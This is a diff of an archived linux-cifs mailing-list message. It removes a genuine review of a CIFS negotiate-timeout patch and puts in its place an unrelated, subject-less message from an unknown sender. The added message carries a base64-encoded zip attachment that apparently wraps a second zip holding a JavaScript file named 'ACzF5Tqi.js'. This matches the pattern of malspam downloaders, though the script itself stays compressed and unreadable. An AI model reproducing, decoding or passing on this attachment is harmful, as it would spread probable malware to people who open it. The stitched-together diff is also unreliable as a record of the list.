@@ -1,42 +1,78 @@
-From: =?utf-8?Q?Aur=C3=A9lien?= Aptel <aaptel-l3A5Bk7waGM@public.gmane.org>
-Subject: Re: [PATCH] cifs: Check for timeout on Negotiate stage
-Date: Tue, 11 Jul 2017 14:18:07 +0200
-Message-ID: <mpsshi3f9q8.fsf@aaptelpc.suse.de>
-References: <20170711104439.23254-1-scabrero@suse.de>
+From: <indulge-HCInDj6vYHrk4FeknX8I/ZqQE7yCjDx5@public.gmane.org>
+Subject: (unknown)
+Date: Tue, 11 Jul 2017 16:39:18 -0000
+Message-ID: <149979115839.5245.1265868391549825500@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8BIT
-Cc: Samuel Cabrero <scabrero-l3A5Bk7waGM@public.gmane.org>
-To: Samuel Cabrero <scabrero-l3A5Bk7waGM@public.gmane.org>, linux-cifs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+Content-Type: application/zip; name="350891340.zip"
+Content-Transfer-Encoding: base64
+To: <linux-cifs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
 Return-path: <linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-In-Reply-To: <20170711104439.23254-1-scabrero-l3A5Bk7waGM@public.gmane.org>
+Subject: 
+Content-Disposition: attachment
 Sender: linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 List-ID: <linux-cifs.vger.kernel.org>
 
-Samuel Cabrero <scabrero-l3A5Bk7waGM@public.gmane.org> writes:
-> Some servers seem to accept connections while booting but never send
-> the SMBNegotiate response neither close the connection, causing all
-> processes accessing the share hang on uninterruptible sleep state.
->
-> This happens when the cifs_demultiplex_thread detects the server is
-> unresponsive so releases the socket and start trying to reconnect.
-> At some point, the faulty server will accept the socket and the TCP
-> status will be set to NeedNegotiate. The first issued command accessing
-> the share will start the negotiation (pid 5828 below), but the response
-> will never arrive so other commands will be blocked waiting on the mutex
-> (pid 55352).
-
-To add to this, the bug happens against Windows Server 2012 R2 and it's
-a bit tricky to reproduce. As Samuel said, the server has to be booted
-long enough to have the tcp stack up but not long enough to have the SMB
-stack fully ready (as it is unresponsive to the nego request). Could be
-a bug on MS side (or some third party installed software?) but I think
-if it results in an avoidable hang on our side it should be fixed.
-
-Reviewed-by: Aurélien Aptel <aaptel-l3A5Bk7waGM@public.gmane.org>
-
--- 
-Aurélien Aptel / SUSE Labs Samba Team
-GPG: 1839 CB5F 9F5B FB9B AA97  8C99 03C8 A49B 521B D5D3
-SUSE Linux GmbH, Maxfeldstraße 5, 90409 Nürnberg, Germany
-GF: Felix Imendörffer, Jane Smithard, Graham Norton, HRB 21284 (AG Nürnberg)
+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
+mspi+tIBUEsFBgAAAAABAAEAXgAAAK8NAAAAAA==
